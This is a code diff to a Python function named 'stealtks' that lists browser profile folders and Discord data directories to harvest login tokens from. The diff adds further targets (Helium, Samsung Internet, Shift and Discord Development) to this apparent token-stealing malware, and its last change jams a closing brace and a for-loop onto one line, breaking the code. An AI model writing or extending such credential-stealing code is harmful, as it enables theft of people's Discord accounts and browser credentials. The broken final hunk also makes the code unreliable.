@@ -335,8 +335,11 @@ def stealtks():
     '0Cent': os.path.join(local, 'CentBrowser', 'User Data'),
     '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
     '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
+    '0Helium': os.path.join(local, 'imput', 'Helium', 'User Data'),
     '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
+    '0SamsungInternet': os.path.join(local, 'Samsung', 'Internet', 'User Data'),
     '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
+    '0Shift': os.path.join(local, 'Shift', 'User Data'),
     '0WaveBrowser': os.path.join(local, 'WaveBrowser', 'User Data'),
     '0CocCoc': os.path.join(local, 'CocCoc', 'Browser', 'User Data'),
     '0Hola': os.path.join(roaming, 'Hola', 'chromium_profile'),
@@ -350,6 +353,7 @@ def stealtks():
     '1Discord': os.path.join(roaming, 'discord'),
     '1DiscordPTB': os.path.join(roaming, 'discordptb'),
     '1DiscordCanary': os.path.join(roaming, 'discordcanary'),
+    '1DiscordDevelopment': os.path.join(roaming, 'discorddevelopment'),
     '1Lightcord': os.path.join(roaming, 'Lighcord'),
     '2OperaOld': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
     '2Operanew': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Default', 'Local Storage', 'leveldb'),
@@ -365,8 +369,7 @@ def stealtks():
     '3Zen': os.path.join(roaming, 'zen', 'Profiles'),
     '3Mullvad': os.path.join(roaming, 'Mullvad', 'MullvadBrowser', 'Profiles'),
     '4Mypal': os.path.join(roaming, 'Mypal68', 'Profiles'),
-    }
-    for browser, path in paths.items():
+    }    for browser, path in paths.items():
         if not os.path.exists(path):
             continue
             
